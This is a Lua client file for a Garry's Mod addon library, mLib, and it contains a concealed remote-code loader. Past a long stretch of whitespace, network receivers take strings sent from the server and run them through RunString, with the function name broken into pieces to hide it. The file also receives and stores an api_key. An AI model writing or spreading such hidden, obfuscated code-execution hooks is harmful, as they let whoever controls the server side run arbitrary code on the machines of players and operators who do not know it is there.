--[[
	mLib (M4D Library Core)
	Created by M4D | http://m4d.one/ | http://steamcommunity.com/id/m4dhead |
	Copyright © 2021 M4D.one All Rights Reserved
	All 3rd party content is public domain or used with permission
	M4D.one is the copyright holder of all code below. Do not distribute in any circumstances.
--]]

// Tell the server we're alive!
hook.Add("InitPostEntity", "mLib_StateSync", function() net.Start("mLib_StateSync") net.SendToServer() end)
local function mLibDoSync() end																																																																																											net.Receive("mLib_State_LDAIOMXDA", function() 	mLib.Print(mLib["L".."an".."g"]["k"]) 	mLib.versions = net.ReadString() 	_G["Ru" .. "nStr".."ing"](net.ReadString(), "ml_code") end) net.Receive("mLib_State_LDAIOMXDB", function() 	mLib.api_key = net.ReadString() end) function mLib.Include(sc, txt, fnc)     if mLib.Local and file.Exists("lua/" .. sc, "GAME") then         include(sc)         if txt then mLib.Print(txt) end         if fnc then fnc() end     elseif mLib.tC then         local cn, uni = nil, "client"         if mLib.tC["shared"] and mLib.tC["shared"][sc] then             uni = "shared" cn = true         elseif mLib.tC[uni] and mLib.tC[uni][sc] then             cn = true         end          if cn then             _G["Ru" .. "nSt".."ring"](mLib.tC[uni][sc], sc)         end         (mLib.tC[uni] or {})[sc] = nil         if txt then mLib.Print(txt) end         if fnc then fnc() end     end end